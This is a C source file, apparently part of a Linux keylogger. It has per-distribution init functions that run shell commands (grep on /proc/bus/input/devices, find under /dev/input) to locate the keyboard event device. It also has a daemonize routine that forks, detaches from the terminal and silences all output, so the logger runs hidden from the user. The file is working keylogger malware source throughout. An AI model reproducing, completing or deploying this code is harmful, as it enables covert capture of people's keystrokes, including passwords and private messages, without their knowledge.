#include <stdlib.h>
#include <stdio.h>  // printf()
#include <unistd.h>  // geteuid()
#include <syslog.h>  // syslog()
#include <errno.h>
#include <string.h>  //strerror()
#include <sys/stat.h>  // umask()

#include "../../includes/keylogger/keylogger_utils.h"
#include "../../includes/keylogger/debian_keylogger_utils.h"
#include "../../includes/keylogger/keylogger.h"


void daemonize_keylogger(void);
/*  Call daemonise fonction, check if user is in root, prepare the command line for find the keyboard device
 *  and launch the function for that.
 */


void ubuntu16_keylogger_init(void)
{
    //daemonize_keylogger();

    /** For Debian **/
    const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 |  grep -Eo event[0-9]";
    //const char *command =  "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";

    /** Ubunutu 16.04 **/
    //const char *command = "find /dev/input/by-id -name '*Device*'";

    /** Kali and Mint 19 **/
    //const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'";

    /** For Debian **/
    debian_get_kb_device_filename(command);

    /** For others distrib **/
    //get_kb_device_filename(command);

    return;
}

void ubuntu18_keylogger_init(void)
{
    //daemonize_keylogger();

    /** For Debian **/
    //const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 |  grep -Eo event[0-9]";
    //const char *command =  "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";

    /** Ubunutu 18**/
    //const char *command = "find /dev/input/by-id -name '*Device*'";
    const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";

    /** Kali and Mint 19 **/
    //const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'";

    /** For Debian and Ubuntu 18 **/
    debian_get_kb_device_filename(command);

    /** For others distrib **/
    //get_kb_device_filename(command);

    return;
}


void mint_keylogger_init(void)
{
    //daemonize_keylogger();

    /* Mint 19 */
    const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'";
    //const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";

    get_kb_device_filename(command);

    //debian_get_kb_device_filename(command);

    return;
}

void debian_keylogger_init(void)
{
    //daemonize_keylogger();

    /* For Debian */
    //const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 |  grep -Eo event[0-9]";
    const char *command =  "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";

    /* For Debian */
    debian_get_kb_device_filename(command);

    return;
}

void kali_keylogger_init(void)
{
    //daemonize_keylogger();

    /* Kali and Mint 19 */
    const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'";

    /* For others distrib */
    get_kb_device_filename(command);

    return;
}

void fedora_keylogger_init(void)
{
    //daemonize_keylogger();

    /* Fedora 28 */
    const char *command =  "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";

    /* For others distrib */
    debian_get_kb_device_filename(command);

    return;
}

/* daemonise the process */
void daemonize_keylogger(void)
{
    pid_t fils;

    fils = fork();

    /** If fork() fail we quit **/
    if(fils < 0)
    {
        syslog(LOG_ERR, "fork() fils : %d : %s", errno, strerror(errno));
        return;
    }

    /** If fork() succed we stop the father **/
    if(fils > 0)
        exit(EXIT_SUCCESS);

    /** Change of directory and we place us to the root folder **/
    if(chdir("/") < 0)
    {
        syslog(LOG_ERR, "chdir() : %d : %s", errno, strerror(errno));
        return;
    }

    /** No rights on the files/folder created **/
    umask(0);


    /**  Redirect standard I/O for cancel all user terminal messages **/
    if(freopen("/dev/null", "r", stdin) == NULL )
    {
        debian_error("freopen() stdin\nfunction : daemonize_keylogger()");
        return;
    }

    if(freopen("/dev/null", "w", stdout) == NULL )
    {
        debian_error("freopen stdout\nfunction : daemonize_keylogger()");
        return;
    }

    if(freopen("/dev/null", "w", stderr) == NULL )
    {
        debian_error("freopen stderr\nfunction : daemonize_keylogger()");
        return;
    }

    return;
}
